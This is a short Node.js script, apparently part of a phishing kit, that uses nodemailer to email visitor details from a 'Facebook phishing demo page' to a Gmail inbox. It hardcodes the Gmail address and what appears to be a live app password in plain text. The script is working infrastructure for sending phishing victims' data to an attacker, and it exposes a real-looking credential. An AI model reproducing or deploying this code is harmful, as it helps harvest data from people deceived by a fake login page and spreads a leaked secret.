const nodemailer = require('nodemailer');

async function sendEmailAlert(details) {
  try {
    let transporter = nodemailer.createTransport({
      service: 'gmail', // e.g., 'gmail', 'outlook', 'yahoo'
      auth: {
        user: 'mwananchihuslerloans@gmail.com', // Your email address
        pass: 'dttd hjuy rlaq oksu' // Your email password or app password
      }
    });

    let info = await transporter.sendMail({
      from: 'mwananchihuslerloans@gmail.com',
      to: 'mwananchihuslerloans@gmail.com', // The email address to receive alerts
      subject: 'Website Visit Alert!',
      text: 'Someone visited your Facebook phishing demo page.\n\nVisitor Details:\n' + details
    });

    console.log('Message sent: %s', info.messageId);
  } catch (error) {
    console.error('Error sending email:', error);
  }
}

sendEmailAlert(process.argv[2]); // Get details from command-line argument
